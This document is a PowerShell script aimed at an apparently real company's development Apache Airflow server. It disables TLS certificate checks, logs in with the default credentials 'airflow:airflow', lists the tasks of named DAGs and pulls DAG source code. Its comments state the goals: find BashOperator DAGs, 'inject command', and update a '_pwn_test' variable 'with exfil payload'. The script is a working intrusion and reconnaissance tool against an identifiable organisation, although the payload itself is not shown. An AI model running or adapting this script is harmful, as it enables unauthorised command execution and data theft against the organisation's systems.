Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAll : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAll
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

$base = "https://dev-airflow.kbfinansia.com"
$encoded = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("airflow:airflow"))

function AF-Get($path) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path")
        $req.Method = "GET"
        $req.Headers.Add("Authorization", "Basic $encoded")
        $resp = $req.GetResponse()
        $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
        return $reader.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) {
            $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            return "ERR:" + $reader.ReadToEnd()
        }
    }
}

function AF-Post($path, $body) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path")
        $req.Method = "POST"
        $req.ContentType = "application/json"
        $req.Headers.Add("Authorization", "Basic $encoded")
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
        $req.ContentLength = $bytes.Length
        $s = $req.GetRequestStream(); $s.Write($bytes,0,$bytes.Length); $s.Close()
        $resp = $req.GetResponse()
        $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
        return $reader.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) {
            $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            return "ERR:" + $reader.ReadToEnd()
        }
        return "EXC:" + $_.Exception.Message
    }
}

function AF-Patch($path, $body) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path")
        $req.Method = "PATCH"
        $req.ContentType = "application/json"
        $req.Headers.Add("Authorization", "Basic $encoded")
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
        $req.ContentLength = $bytes.Length
        $s = $req.GetRequestStream(); $s.Write($bytes,0,$bytes.Length); $s.Close()
        $resp = $req.GetResponse()
        $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
        return $reader.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) {
            $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            return "ERR:" + $reader.ReadToEnd()
        }
    }
}

# Get DAG source file to find BashOperator DAGs
# Use file_token to read DAG source
$dag_ids = @("deploy_kafka_connector","backup_log_am_net","dbdocs_build_dbml_dynamic","data_rapindo","export_mssql_to_google_sheets")

foreach ($dag in $dag_ids) {
    Write-Host "`n=== TASKS for $dag ==="
    $tasks = AF-Get "/api/v1/dags/$dag/tasks"
    Write-Host $tasks
}

# Try to get DAG source files
Write-Host "`n=== DAG SOURCE deploy_kafka_connector ==="
$r = AF-Get "/api/v1/dagSources/.eJxT0s8vKNFPzCxKy8kv109JTC_Wz87NT4rPzc8rycipBInEIwvoFVQqAQAEsxPe.frdPIH4Ld-Zc27kzKYh_xzlbWyg"
Write-Host $r

# Check if we can write/update existing DAG variable to inject command
# The confins-r3-api-key variable value is already base64 -- but more importantly:
# Try to update _pwn_test variable with exfil payload

# Check what tasks deploy_kafka_connector has - it's a BashOperator likely
Write-Host "`n=== DEPLOY KAFKA TASKS ==="
$r2 = AF-Get "/api/v1/dags/deploy_kafka_connector/tasks"
Write-Host $r2
